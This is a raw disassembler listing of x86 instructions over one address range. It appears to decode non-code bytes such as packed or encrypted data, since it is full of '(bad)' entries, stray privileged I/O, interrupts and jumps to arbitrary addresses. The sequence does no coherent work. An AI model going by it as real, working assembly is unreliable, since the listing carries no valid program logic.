  428b68:	cld    
  428b69:	loop   0x428b40
  428b6b:	and    esi,ecx
  428b6d:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428b6f:	stos   DWORD PTR es:[edi],eax
  428b70:	mov    al,ds:0x1e7fb05
  428b75:	loop   0x428b0e
  428b77:	push   ds
  428b78:	or     esp,edx
  428b7a:	sbb    esi,edx
  428b7c:	mov    ecx,0x1ce9cec5
  428b81:	imul   esp,edi,0x3e
  428b84:	jle    0x428bbc
  428b86:	sub    eax,0x98e399d3
  428b8b:	jns    0x428b2e
  428b8d:	pop    ecx
  428b8e:	addr16 dec edx
  428b90:	dec    ecx
  428b91:	repnz ins BYTE PTR es:[edi],dx
  428b93:	int    0x93
  428b95:	lea    edi,cs:[ebp+0x7f]
  428b99:	inc    ecx
  428b9a:	jge    0x428bde
  428b9c:	test   eax,0x3728201c
  428ba1:	cmp    eax,0x8480e753
  428ba6:	or     dl,BYTE PTR [ecx]
  428ba8:	(bad)  
  428baa:	into   
  428bab:	adc    eax,0x64115073
  428bb0:	clc    
  428bb1:	sub    DWORD PTR [ebp+0x3357e6db],ebp
  428bb7:	pop    es
  428bb8:	in     al,dx
  428bb9:	push   edx
  428bba:	inc    esi
  428bbb:	inc    edx
  428bbc:	repz sti 
  428bbe:	pop    ebx
  428bbf:	loopne 0x428c29
  428bc1:	rcl    DWORD PTR [esi-0xd3e608b],cl
  428bc7:	mov    ebp,0xe9be207e
  428bcc:	adc    DWORD PTR [edx-0x43],edi
  428bcf:	pushf  
  428bd0:	or     DWORD PTR [ebp+0x6333a3f2],esi
  428bd6:	jb     0x428c3f
  428bd8:	xchg   ebp,eax
  428bd9:	xchg   edx,eax
  428bda:	std    
  428bdb:	dec    DWORD PTR [esi+0x3a]
  428bde:	xor    BYTE PTR [edi+0x6a6379fb],bl
  428be4:	xchg   edi,eax
  428be5:	jmp    0x7904a8b4
  428bea:	xchg   edx,eax
  428beb:	cmp    cl,dh
  428bed:	int    0x0
	...
  428c53:	add    BYTE PTR [eax],al
  428c55:	add    ch,al
  428c57:	push   ebp
  428c58:	mov    bh,dl
  428c5a:	call   0xbbc:0x947ff5ff
  428c61:	push   0x6cf9fb8d
  428c66:	addr16 mov ch,0x1
  428c69:	add    BYTE PTR [eax],al
  428c6b:	add    DWORD PTR [eax],eax
  428c6d:	add    cl,ah
  428c6f:	and    al,0x63
  428c71:	popf   
  428c72:	adc    al,0x91
  428c74:	mov    esi,0x5d20ceae
  428c79:	xchg   edi,eax
  428c7a:	mov    edx,0xbc43c75a
  428c7f:	mov    al,ds:0x58760852
  428c84:	push   ebx
  428c85:	dec    edi
  428c86:	pop    esp
  428c87:	add    esp,eax
  428c89:	sbb    bh,bh
  428c8b:	cmovne edi,DWORD PTR [eax-0x3dc2a25d]
  428c92:	(bad)  
  428c93:	jmp    0x428c63
  428c95:	pop    eax
  428c96:	add    dl,BYTE PTR [eax]
  428c98:	or     BYTE PTR [edx+eax*2-0x39002cb1],dl
  428c9f:	mov    edx,0xe41dc243
  428ca4:	(bad)  
  428ca5:	pop    esi
  428ca6:	test   eax,0x1591b3cc
  428cab:	add    ebx,DWORD PTR [ebp+0x32ea9270]
  428cb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428cb2:	xchg   ecx,eax
  428cb3:	lds    eax,FWORD PTR [ebp+0x49]
  428cb6:	xor    al,0x6f
  428cb8:	pop    DWORD PTR [edi]
  428cba:	pop    ebp
  428cbb:	sub    DWORD PTR [edx*2-0x648c9857],esi
  428cc2:	popa   
  428cc3:	aaa    
  428cc4:	scas   al,BYTE PTR es:[edi]
  428cc5:	adc    ch,BYTE PTR [esi]
  428cc7:	jp     0x428d3c
  428cc9:	cld    
  428cca:	add    esp,esi
  428ccc:	add    BYTE PTR [eax-0x7e],bl
  428ccf:	mov    esi,DWORD PTR [ebp+0x58]
  428cd2:	das    
  428cd3:	jmp    0x9aa3d35c
  428cd8:	mov    ebp,0x6ff81046
  428cdd:	sbb    bl,BYTE PTR [esi+eax*2]
  428ce0:	lds    ebp,FWORD PTR [ebx-0x69]
  428ce3:	add    esp,DWORD PTR [edi-0x2ae44198]
  428ce9:	mov    ebp,0x57ed148f
  428cee:	inc    eax
  428cef:	add    BYTE PTR [esi-0x7e],ch
  428cf2:	mov    ds:0xbb811030,eax
  428cf7:	sub    al,0x8b
  428cf9:	push   ecx
  428cfa:	in     eax,0x0
  428cfc:	aam    0x96
  428cfe:	sbb    BYTE PTR [eax+0x49],al
  428d01:	push   eax
  428d02:	in     eax,0xe8
  428d04:	mov    ebx,0x3ab49ad5
  428d09:	and    al,0xe1
  428d0b:	xchg   ebx,eax
  428d0c:	adc    ebx,DWORD PTR [ebx+ebp*8+0x6fdeaeb7]
  428d13:	inc    esp
  428d14:	jmp    0x9b1d410c
  428d19:	fsub   DWORD PTR [esi-0x24]
  428d1c:	dec    ecx
  428d1d:	ret    
  428d1e:	mov    dl,0x4f
  428d20:	adc    esp,esp
  428d22:	lods   al,BYTE PTR ds:[esi]
  428d23:	call   0xdaecaba1
  428d28:	push   0x142eac87
  428d2d:	adc    ah,BYTE PTR [edx-0x16]
  428d30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428d31:	add    BYTE PTR [edi+0x7a07b501],0xb3
  428d38:	mov    ds,WORD PTR [eax-0x2ebb61ff]
  428d3e:	es pop ds
  428d40:	sbb    eax,0xed53134d
  428d45:	push   es
  428d46:	shl    BYTE PTR [ecx+0x48],1
  428d49:	lds    esp,FWORD PTR [edx+0x211bce2d]
  428d4f:	(bad)  
  428d50:	pop    eax
  428d51:	pop    esi
  428d52:	push   0xfffffff1
  428d54:	jb     0x428cf7
  428d56:	rcr    DWORD PTR [esi+ebp*8-0x14fff9d4],0x49
  428d5e:	push   0x39
  428d60:	test   eax,0x9223593a
  428d65:	xor    ch,BYTE PTR [esi]
  428d67:	popa   
  428d68:	add    al,0xd5
  428d6a:	push   cs
  428d6b:	mov    ebx,0xa456
	...
  428dd4:	add    BYTE PTR [eax],al
  428dd6:	xor    DWORD PTR [ebp+0x75f531f1],0xcc90b5c1
  428de0:	ins    BYTE PTR es:[edi],dx
  428de1:	retf   0x6943
  428de4:	mov    ah,0x69
  428de6:	addr16 mov dh,0x1
  428de9:	add    BYTE PTR [eax],al
  428deb:	add    DWORD PTR [eax],eax
  428ded:	add    BYTE PTR [edx],cl
  428def:	xlat   BYTE PTR ds:[ebx]
  428df0:	dec    esi
  428df1:	pop    ds
  428df2:	add    dl,cl
  428df4:	xor    al,BYTE PTR [esi]
  428df6:	add    BYTE PTR [edx-0x5c],bl
  428df9:	mov    bl,0xe9
  428dfb:	push   ss
  428dfc:	ins    BYTE PTR es:[edi],dx
  428dfd:	or     ch,ah
  428dff:	aam    0xf6
  428e01:	mov    dl,0x93
  428e03:	fldz   
  428e05:	pusha  
  428e06:	mov    DWORD PTR [ebp-0x370ea980],esi
  428e0c:	stc    
  428e0d:	ds icebp 
  428e0f:	(bad)  
  428e10:	or     edi,DWORD PTR [eax]
  428e12:	(bad)  
  428e13:	xor    dl,BYTE PTR ds:0x8c3df97f
  428e19:	aas    
  428e1a:	lahf   
  428e1b:	xor    al,0x11
  428e1d:	rol    dl,0x32
  428e20:	out    0x47,eax
  428e22:	out    0x15,eax
  428e24:	(bad)  
  428e25:	out    dx,al
  428e26:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  428e28:	lods   eax,DWORD PTR ds:[esi]
  428e29:	push   esi
  428e2a:	push   edi
  428e2b:	inc    edi
  428e2c:	popa   
  428e2d:	lahf   
  428e2e:	shr    BYTE PTR ds:0xf0a059d7,1
  428e34:	inc    ebp
  428e35:	pop    es
  428e36:	jns    0x428e67
  428e38:	ja     0x428dc0
  428e3a:	pop    ds
  428e3b:	adc    DWORD PTR [ebp+0x4d],ebx
  428e3e:	xlat   BYTE PTR ds:[ebx]
  428e3f:	jnp    0x428eb5
  428e41:	(bad)  
  428e42:	cmp    BYTE PTR [ebp+0x3a],ch
  428e45:	loop   0x428dde
  428e47:	cwde   
  428e48:	jno    0x428e11
  428e4a:	xchg   ebp,eax
  428e4b:	cwde   
  428e4c:	cmp    DWORD PTR [eax],edx
  428e4e:	enter  0x21bb,0xd7
  428e52:	sub    al,0x1d
  428e54:	in     eax,0xf5
  428e56:	loope  0x428e95
  428e58:	adc    BYTE PTR [edi-0x30],0x60
  428e5c:	cmp    al,0x3e
  428e5e:	adc    BYTE PTR [ecx-0x10],ch
  428e61:	inc    ebx
  428e62:	mov    ds:0x467435bd,al
  428e67:	call   FWORD PTR [edi]
  428e69:	mov    ch,0xc1
  428e6b:	mov    al,ds:0xfb884022
  428e70:	lods   al,BYTE PTR ds:[esi]
  428e71:	(bad)  
  428e72:	nop
  428e73:	jg     0x428e41
  428e75:	pop    edx
  428e76:	xor    eax,0x2265ebb3
  428e7b:	aam    0xff
  428e7d:	test   DWORD PTR [ecx],0xaea0ffc6
  428e83:	fbld   TBYTE PTR [esi+0x484eebf7]
  428e89:	pop    ebx
  428e8a:	sub    eax,0x333416da
  428e8f:	mov    bl,BYTE PTR [ebx+0x7b]
  428e92:	jp     0x428e63
  428e94:	jno    0x428e7a
  428e96:	pop    esi
  428e97:	push   cs
  428e98:	sbb    al,0x93
  428e9a:	mul    BYTE PTR [ebp-0x638bd703]
  428ea0:	(bad)  
  428ea1:	adc    dh,BYTE PTR [ebp-0x3]
  428ea4:	pop    edx
  428ea5:	call   0x1fdc:0x63da0219
  428eac:	inc    edi
  428ead:	(bad)  
  428eae:	mov    ecx,0xbd86116f
  428eb3:	lea    ecx,[edi-0x41]
  428eb6:	push   ebx
  428eb7:	rol    DWORD PTR [esp-0x52],0xfc
  428ebc:	push   edi
  428ebd:	into   
  428ebe:	and    al,0xfd
  428ec0:	mov    WORD PTR [esi+0x35],?
  428ec3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428ec4:	loopne 0x428f45
  428ec6:	cmp    DWORD PTR [edi-0x10],esp
  428ec9:	repz inc ecx
  428ecb:	sub    al,0xaf
  428ecd:	sub    edi,DWORD PTR [esp+edx*4-0x697bfee3]
  428ed4:	(bad)  
  428ed5:	jl     0x428f08
  428ed7:	adc    al,BYTE PTR [ebp-0x73]
  428eda:	mov    ah,0xf6
  428edc:	inc    edi
  428edd:	jb     0x428ea0
  428edf:	(bad)  
  428ee0:	mov    ds:0x411c5bed,al
  428ee5:	popf   
  428ee6:	pop    ebx
  428ee7:	and    eax,0x52478522
  428eec:	jno    0x428f3c
	...
  428f56:	dec    edi
  428f57:	pop    ebp
  428f58:	pop    ecx
  428f59:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428f5d:	fstp   st(1)
  428f5f:	ror    DWORD PTR [esp+edx*4],0x26
  428f63:	xchg   DWORD PTR [edx+0x1b76764],eax
  428f69:	add    BYTE PTR [eax],al
  428f6b:	add    DWORD PTR [eax],eax
  428f6d:	add    BYTE PTR [edx],dh
  428f6f:	xchg   edi,eax
  428f70:	sti    
  428f71:	imul   esi,DWORD PTR [esi+0x7],0xe8488e9b
  428f78:	out    dx,al
  428f79:	jge    0x428fa1
  428f7b:	pop    eax
  428f7c:	dec    edx
  428f7d:	sbb    BYTE PTR [ebx],dh
  428f7f:	mov    ch,0xc0
  428f81:	xchg   esi,eax
  428f82:	les    edx,FWORD PTR cs:[ebx-0x7175f213]
  428f89:	fld    QWORD PTR [ecx-0x65]
  428f8c:	ss ds fs out dx,al
  428f90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428f91:	je     0x428fa4
  428f93:	cmp    eax,0xcc557942
  428f98:	pushf  
  428f99:	je     0x428f9e
  428f9b:	inc    esp
  428f9c:	and    eax,edi
  428f9e:	xor    BYTE PTR [eax+0x1889be0e],0xb3
  428fa5:	xor    BYTE PTR [ebx-0x6b107655],dl
  428fab:	and    eax,0x994c87b7
  428fb0:	cdq    
  428fb1:	push   ebx
  428fb2:	rol    esi,0x3b
  428fb5:	xchg   esi,eax
  428fb6:	mov    WORD PTR [ebx*2+0x51e355d6],?
  428fbd:	sub    eax,0x3d3e5f96
  428fc2:	adc    DWORD PTR [edi],edi
  428fc4:	jbe    0x428f8b
  428fc6:	bound  ebx,QWORD PTR [ebx]
  428fc8:	arpl   WORD PTR [ebp+0x6278475e],di
  428fce:	sbb    dl,BYTE PTR [ecx+0x41]
  428fd1:	inc    ebx
  428fd2:	out    0xa5,eax
  428fd4:	das    
  428fd5:	or     ah,BYTE PTR [ebx-0x6b]
  428fd8:	mov    edi,0x9816582b
  428fdd:	pop    esp
  428fde:	xchg   ebp,edx
  428fe0:	clc    
  428fe1:	dec    esp
  428fe2:	popa   
  428fe3:	inc    ebx
  428fe4:	cld    
  428fe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428fe6:	mov    BYTE PTR [ebx+eax*1],bl
  428fe9:	push   edi
  428fea:	leave  
  428feb:	imul   esp,DWORD PTR [edi-0xa],0xf10fad63
  428ff2:	cmp    ebp,DWORD PTR [ebx]
  428ff4:	out    0x81,eax
  428ff6:	fsub   QWORD PTR [ebx-0x534921e6]
  428ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428ffd:	inc    ebp
  428ffe:	mov    ebp,0x8dee80ae
  429003:	cmp    DWORD PTR [edi+0x77263e28],esp
  429009:	addr16 popf 
  42900b:	sub    edi,DWORD PTR [edx+0x57173e9]
  429011:	pusha  
  429012:	inc    ebx
  429013:	ds mov bh,0xb
  429016:	jne    0x428ffa
  429018:	push   edx
  429019:	jecxz  0x429024
  42901b:	sti    
  42901c:	pop    edx
  42901d:	mov    bl,0xdd
  42901f:	fs leave 
  429021:	pop    edx
  429022:	iret   
  429023:	push   esp
  429024:	mov    bl,BYTE PTR [ebp-0x6f]
  429027:	xlat   BYTE PTR ds:[ebx]
  429028:	div    DWORD PTR [esi+0x3c895478]
  42902e:	lahf   
  42902f:	sub    esi,ebx
  429031:	dec    ebp
  429032:	mov    cl,BYTE PTR [ecx+0x186acb88]
  429038:	push   eax
  429039:	dec    esp
  42903a:	pop    ss
  42903b:	cmp    BYTE PTR [esi+0x3b94c5e3],ch
  429041:	sub    esi,ebp
  429043:	push   eax
  429044:	pop    ebp
  429045:	xchg   BYTE PTR [edi+0x682ee892],bh
  42904b:	std    
  42904c:	cdq    
  42904d:	mov    WORD PTR [edi+0x2e],?
  429050:	mov    ebp,0x738ca3cc
  429055:	sub    al,bl
  429057:	pmaxsw mm3,QWORD PTR [eax-0x68]
  42905b:	popa   
  42905c:	call   0xdec3cf28
  429061:	enter  0x682d,0x1e
  429065:	and    ch,BYTE PTR [ebp+ebp*2-0x3f8c915e]
  42906c:	jp     0x4290d5
	...
  4290d6:	loope  0x4290c4
  4290d8:	mov    ebx,es
  4290da:	(bad)  
  4290db:	jecxz  0x4290cc
  4290dd:	out    dx,al
  4290de:	mov    edi,0xfefc7b77
  4290e3:	inc    ebp
  4290e4:	xor    al,0x0
  4290e6:	addr16 mov eax,0x1000001
  4290ec:	add    BYTE PTR [eax],al
  4290ee:	sub    BYTE PTR [ecx],ah
  4290f0:	ret    0x519a
  4290f3:	adc    DWORD PTR [ebx+0x62],ebp
  4290f6:	xchg   ebp,eax
  4290f7:	jmp    0xf4e0:0x1e7b9a57
  4290fe:	sbb    eax,0x7c5a9142
  429103:	push   eax
  429104:	mov    esp,0xf538c9a9
  429109:	jecxz  0x4290e8
  42910b:	icebp  
  42910c:	mov    ?,WORD PTR [esi+eax*8-0x18efedb0]
  429113:	ja     0x4290a5
  429115:	sub    bh,BYTE PTR [edi-0x3451a8e3]
  42911b:	jle    0x4290c5
  42911d:	pop    ecx
  42911e:	pop    es
  42911f:	dec    eax
  429120:	adc    eax,0x34897775
  429125:	adc    eax,0xaef7f473
  42912a:	(bad)  
  42912b:	fs clc 
  42912d:	dec    ecx
  42912e:	xchg   ebp,eax
  42912f:	cmp    al,0x14
  429131:	neg    BYTE PTR [ebx+0x62]
  429134:	into   
  429135:	pop    edx
  429136:	call   FWORD PTR [ebx+0x39]
  429139:	pop    es
  42913a:	jle    0x429175
  42913c:	push   ecx
  42913d:	sub    al,0xe7
  42913f:	repnz lea edi,[esi-0x563d20ea]
  429146:	or     esp,DWORD PTR [edi+eiz*1]
  429149:	outs   dx,DWORD PTR ds:[esi]
  42914a:	mov    esp,DWORD PTR [ecx]
  42914c:	push   eax
  42914d:	lods   eax,DWORD PTR ds:[esi]
  42914e:	and    dh,BYTE PTR [edx-0x3b5468d2]
  429154:	in     eax,0x35
  429156:	in     eax,dx
  429157:	mov    ebp,0x6165e644
  42915c:	cmp    al,cl
  42915e:	inc    edx
  42915f:	sar    dl,0x90
  429162:	in     al,dx
  429163:	inc    ecx
  429164:	dec    ebx
  429165:	add    dl,bl
  429167:	popa   
  429168:	scas   al,BYTE PTR es:[edi]
  429169:	cmp    DWORD PTR [edx+0x44c6f0de],ecx
  42916f:	xchg   DWORD PTR [esi+0x6973ad0e],edx
  429175:	xchg   ebx,eax
  429176:	adc    eax,0xb8105973
  42917b:	add    eax,0x50219271
  429180:	scas   eax,DWORD PTR es:[edi]
  429181:	fldenv [ebx]
  429183:	pop    es
  429184:	sbb    BYTE PTR [ebx-0x10],bh
  429187:	pop    ebx
  429188:	(bad)  
  429189:	sbb    eax,ebx
  42918b:	daa    
  42918c:	mov    ebp,0xdf9b20f1
  429191:	adc    DWORD PTR [esi-0x64],esp
  429194:	mov    DWORD PTR [ecx+0x3c],esp
  429197:	test   DWORD PTR [ecx+0x240c42c1],eax
  42919d:	call   0x6284:0x15ba552
  4291a4:	adc    DWORD PTR [edx+0x7ae9afa],ebx
  4291aa:	aam    0x6a
  4291ac:	in     al,0x33
  4291ae:	jns    0x429191
  4291b0:	(bad)  
  4291b1:	in     al,0xc9
  4291b3:	into   
  4291b4:	mov    ebx,0xed3d3b86
  4291b9:	jns    0x429234
  4291bb:	in     eax,0x47
  4291bd:	inc    edx
  4291be:	fs into 
  4291c0:	std    
  4291c1:	stc    
  4291c2:	nop
  4291c3:	xchg   BYTE PTR [esi+ebp*1+0x17800685],dh
  4291ca:	fiadd  WORD PTR [ebp-0x432a80d2]
  4291d0:	shr    BYTE PTR ds:0xa0efa10a,0x6f
  4291d7:	mov    WORD PTR [ebx],fs
  4291d9:	test   eax,0x38027d6d
  4291de:	dec    ecx
  4291df:	popa   
  4291e0:	fwait
  4291e1:	in     al,0xde
  4291e3:	scas   al,BYTE PTR es:[edi]
  4291e4:	mov    ah,0x3f
  4291e6:	inc    esi
  4291e7:	mov    eax,ds:0xf2ae360e
  4291ec:	add    eax,0x5c
	...
  429255:	add    BYTE PTR [esi-0x79],dl
  429258:	std    
  429259:	test   ch,bh
  42925b:	(bad)  
  42925c:	jg     0x429235
  42925e:	into   
  42925f:	retf   
  429260:	or     DWORD PTR [esi+eax*1+0x672b50ad],0x1b9
  42926b:	add    DWORD PTR [eax],eax
  42926d:	add    BYTE PTR [edi+0x56486077],bh
  429273:	cld    
  429274:	cmp    DWORD PTR [esi+0x5e],0x12
  429278:	hlt    
  429279:	scas   al,BYTE PTR es:[edi]
  42927a:	mov    eax,ds:0x84b056a5
  42927f:	and    bl,ah
  429281:	adc    DWORD PTR [esi+edx*8+0x306e2c70],esi
  429288:	(bad)  
  429289:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42928a:	or     ebx,esi
  42928c:	inc    edi
  42928d:	dec    eax
  42928e:	loope  0x42925b
  429290:	jb     0x429300
  429292:	sub    eax,0x74f75a15
  429297:	xchg   edx,eax
  429298:	inc    ebx
  429299:	and    al,0x6
  42929b:	jge    0x429247
  42929d:	inc    ebp
  42929e:	test   ah,cl
  4292a0:	hlt    
  4292a1:	push   edi
  4292a2:	pusha  
  4292a3:	jge    0x429243
  4292a5:	or     dh,BYTE PTR [eax+0x48200ffd]
  4292ab:	xchg   esi,eax
  4292ac:	ret    
  4292ad:	shl    DWORD PTR [ebp-0xb],cl
  4292b0:	push   ss
  4292b1:	or     esi,DWORD PTR [ecx]
  4292b3:	pop    ebp
  4292b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4292b5:	retf   0xc7ae
  4292b8:	push   eax
  4292b9:	mov    bh,0x64
  4292bb:	ins    DWORD PTR es:[edi],dx
  4292bc:	xchg   DWORD PTR [ebp+0x3b0ad367],edi
  4292c2:	in     al,dx
  4292c3:	jp     0x4292a9
  4292c5:	cdq    
  4292c6:	dec    edi
  4292c7:	das    
  4292c8:	push   es
  4292c9:	mov    ds:0xd0ca1115,eax
  4292ce:	or     ebx,DWORD PTR [ebp+0x21]
  4292d1:	mov    bh,0x51
  4292d3:	mov    ds:0x7c970995,eax
  4292d8:	fwait
  4292d9:	push   ebx
  4292da:	adc    WORD PTR [ebp-0x4e],sp
  4292de:	jle    0x429290
  4292e0:	pushf  
  4292e1:	out    0xcb,al
  4292e3:	fsub   DWORD PTR [eax]
  4292e5:	aam    0x2a
  4292e7:	xor    esp,DWORD PTR [eax-0x5b7031b4]
  4292ed:	daa    
  4292ee:	cmp    ebp,ebx
  4292f0:	jge    0x429336
  4292f2:	cmp    ah,BYTE PTR [ebx]
  4292f4:	mov    ch,0x6
  4292f6:	call   0x5b683e43
  4292fb:	out    0xee,eax
  4292fd:	xor    eax,0xfb94a483
  429302:	xchg   edx,ecx
  429304:	push   0x44
  429306:	mov    cl,0x87
  429308:	(bad)  
  42930a:	mov    WORD PTR [edx],?
  42930c:	sub    BYTE PTR [ebx+0x176b0c9f],cl
  429312:	lock in al,dx
  429314:	std    
  429315:	xchg   esp,eax
  429316:	stc    
  429317:	maskmovq mm4,(bad)
  429318:	mul    DWORD PTR [edx-0x76]
  42931b:	dec    ebx
  42931c:	dec    edx
  42931d:	xor    al,ch
  42931f:	loopne 0x42937e
  429321:	es call 0xe44bd556
  429327:	push   edx
  429328:	mov    dl,0x1a
  42932a:	lods   al,BYTE PTR ds:[esi]
  42932b:	inc    edi
  42932c:	sbb    ebp,DWORD PTR [eax]
  42932e:	add    DWORD PTR [ecx+eiz*8+0x5f],0x36
  429333:	retf   
  429334:	jg     0x4292ba
  429336:	fidivr DWORD PTR [edx+0x4798cdd5]
  42933c:	mov    DWORD PTR [edi],esp
  42933e:	hlt    
  42933f:	aas    
  429340:	inc    edx
  429341:	or     DWORD PTR [esi],0x496736e3
  429347:	adc    BYTE PTR [eax+0x618d30f7],bl
  42934d:	lods   eax,DWORD PTR ds:[esi]
  42934e:	stos   DWORD PTR es:[edi],eax
  42934f:	shl    BYTE PTR [ebx+0x1d],1
  429352:	xor    al,0x4e
  429354:	inc    esp
  429355:	jae    0x429371
  429357:	outs   dx,BYTE PTR ds:[esi]
  429358:	xchg   esi,eax
  429359:	mov    bl,0xf8
  42935b:	xchg   edi,ecx
  42935d:	fwait
  42935e:	mov    ds,eax
  429360:	push   ds
  429361:	dec    esi
  429362:	jmp    0x4293d7
  429364:	rol    BYTE PTR [ebx+ebx*2],0x1b
  429368:	mov    al,0x10
  42936a:	arpl   ax,bp
  42936c:	test   eax,0x87
	...
  4293d5:	add    al,dh
  4293d7:	adc    al,0xe1
  4293d9:	(bad)  
  4293da:	in     eax,0xff
  4293dc:	call   FWORD PTR [esi]
  4293de:	jae    0x4293e5
  4293e0:	dec    edx
  4293e1:	mov    bh,0x20
  4293e3:	nop
  4293e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4293e5:	loope  0x42944e
  4293e7:	mov    edx,0x1000001
  4293ec:	add    BYTE PTR [eax],al
  4293ee:	jbe    0x42945b
  4293f0:	es xchg ebx,eax
  4293f2:	cs cs mov edi,0x3f30385f
  4293f9:	mov    ds:0x6fe6bdcc,eax
  4293fe:	test   eax,0xbe282575
  429403:	repz adc BYTE PTR [eax],dh
  429406:	lahf   
  429407:	inc    ecx
  429408:	iret   
  429409:	mov    eax,0x35817ca2
  42940e:	out    dx,al
  42940f:	mov    bh,0x33
  429411:	jae    0x429447
  429413:	inc    ebp
  429414:	or     BYTE PTR [ecx+0x2e941288],bh
  42941a:	test   al,0xe0
  42941c:	cs xchg ebp,eax
  42941e:	xchg   edx,eax
  42941f:	fisttp QWORD PTR [esi-0x6c03a87]
  429425:	lods   al,BYTE PTR ds:[esi]
  429426:	jb     0x42948a
  429428:	adc    al,ah
  42942a:	les    esi,FWORD PTR [ecx-0x67bf62e]
  429430:	add    al,0xfa
  429432:	inc    eax
  429433:	enter  0x7a08,0x88
  429437:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429438:	sub    BYTE PTR [ecx-0x7985a872],dl
  42943e:	jg     0x4294bf
  429440:	mov    DWORD PTR [edi],ebp
  429442:	add    eax,0x2333e95c
  429447:	sahf   
  429448:	xchg   edi,eax
  429449:	add    al,0x96
  42944b:	xchg   BYTE PTR [ecx],bl
  42944d:	daa    
  42944e:	popf   
  42944f:	push   ebp
  429450:	rcr    BYTE PTR [edi-0x1c],0x58
  429454:	mov    ch,0x9b
  429456:	sub    bh,BYTE PTR [esi-0x59]
  429459:	loopne 0x429408
  42945b:	add    eax,0xd16c44bb
  429460:	lea    edi,[edx-0x73]
  429463:	loope  0x42942d
  429465:	loope  0x4294ad
  429467:	arpl   WORD PTR [edx+ecx*2-0x16dcce84],dx
  42946e:	bsf    esi,DWORD PTR [ecx]
  429471:	xchg   ecx,eax
  429472:	or     eax,0xf6aef1b4
  429477:	sti    
  429478:	dec    edi
  429479:	rcl    BYTE PTR [esi-0x33],cl
  42947c:	and    bl,BYTE PTR [ecx]
  42947e:	fstp   DWORD PTR [eax+0x1d6e9c9d]
  429484:	cmp    al,BYTE PTR [eax+0x26]
  429487:	push   ebx
  429488:	lods   eax,DWORD PTR ds:[esi]
  429489:	add    bh,bl
  42948b:	call   0x70e46b90
  429490:	out    dx,eax
  429491:	or     DWORD PTR [edi+0x76c86288],esi
  429497:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429498:	outs   dx,BYTE PTR ds:[esi]
  429499:	mov    bl,BYTE PTR [edx-0x4793b4ea]
  42949f:	test   al,cl
  4294a1:	xsavec [ecx]
  4294a4:	pusha  
  4294a5:	loopne 0x4294b0
  4294a7:	jp     0x4294e2
  4294a9:	jle    0x429477
  4294ab:	push   eax
  4294ac:	repnz cmp eax,DWORD PTR [eax+0x61]
  4294b0:	call   FWORD PTR [edi]
  4294b2:	int    0x3c
  4294b4:	mov    ah,0x6c
  4294b6:	pop    edi
  4294b7:	jo     0x429527
  4294b9:	add    edi,edx
  4294bb:	dec    ebx
  4294bc:	(bad)  [esi-0x60]
  4294bf:	ret    
  4294c0:	fstp   DWORD PTR [ecx]
  4294c2:	in     eax,dx
  4294c3:	pop    es
  4294c4:	xor    al,0x77
  4294c6:	das    
  4294c7:	aaa    
  4294c8:	adc    eax,0x4c886666
  4294cd:	rcr    DWORD PTR [esi+0x128d3a52],0xf
  4294d4:	jl     0x4294f6
  4294d6:	dec    eax
  4294d7:	das    
  4294d8:	pop    ebp
  4294d9:	sbb    DWORD PTR [esi-0xf],ecx
  4294dc:	xchg   BYTE PTR [ebx-0x60],dh
  4294df:	ja     0x4294f7
  4294e1:	mov    ah,0x6b
  4294e3:	(bad)  
  4294e4:	mov    al,0xa8
  4294e6:	out    0xb6,eax
  4294e8:	or     DWORD PTR [ecx-0x1b],eax
  4294eb:	lahf   
  4294ec:	dec    ebp
  4294ed:	mov    ebx,0x0
	...
  429556:	dec    esp
  429557:	or     eax,0x3e532c13
  42955c:	jg     0x4295cb
  42955e:	dec    esp
  42955f:	arpl   WORD PTR [ebp+0x159e1dea],dx
  429565:	shl    BYTE PTR [edi-0x45],cl
  429568:	add    DWORD PTR [eax],eax
  42956a:	add    BYTE PTR [ecx],al
  42956c:	add    BYTE PTR [eax],al
  42956e:	and    eax,0xfa184ade
  429573:	jmp    0xa8ec:0x8143e959
  42957a:	je     0x429583
  42957c:	mov    bl,0x9b
  42957e:	xor    eax,DWORD PTR [ecx]
  429580:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429581:	pop    eax
  429582:	cmp    esi,ebx
  429584:	jno    0x4295a7
  429586:	leave  
  429587:	sub    al,0x99
  429589:	rcl    esi,cl
  42958b:	outs   dx,DWORD PTR ds:[esi]
  42958c:	sahf   
  42958d:	mov    ebx,0x7c05907a
  429592:	sbb    edx,ecx
  429594:	mov    DWORD PTR [esi-0x10],eax
  429597:	mov    bl,0xf7
  429599:	pop    ebx
  42959a:	je     0x4295fc
  42959c:	iret   
  42959d:	cld    
  42959e:	retf   
  42959f:	add    al,0x18
  4295a1:	adc    ecx,DWORD PTR [ebx+0x634a7bec]
  4295a7:	lahf   
  4295a8:	cld    
  4295a9:	leave  
  4295aa:	jge    0x429544
  4295ac:	sbb    al,0xc1
  4295ae:	lahf   
  4295af:	out    dx,al
  4295b0:	call   0x770f:0xfbe516e5
  4295b7:	pop    ebx
  4295b8:	into   
  4295b9:	adc    esp,DWORD PTR [edx+0xb]
  4295bc:	jb     0x429629
  4295be:	push   edx
  4295bf:	pop    edx
  4295c0:	push   edx
  4295c1:	(bad)  
  4295c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4295c3:	xchg   ah,al
  4295c5:	xor    edi,DWORD PTR [ebx]
  4295c7:	add    esp,DWORD PTR [eax]
  4295c9:	or     DWORD PTR [esi+ebx*4+0x79],ebx
  4295cd:	jl     0x4295a6
  4295cf:	mov    BYTE PTR [esi],dh
  4295d1:	push   0x7678483a
  4295d6:	into   
  4295d7:	(bad)  
  4295d8:	mov    ds:0xb0164437,al
  4295dd:	pop    ebx
  4295de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
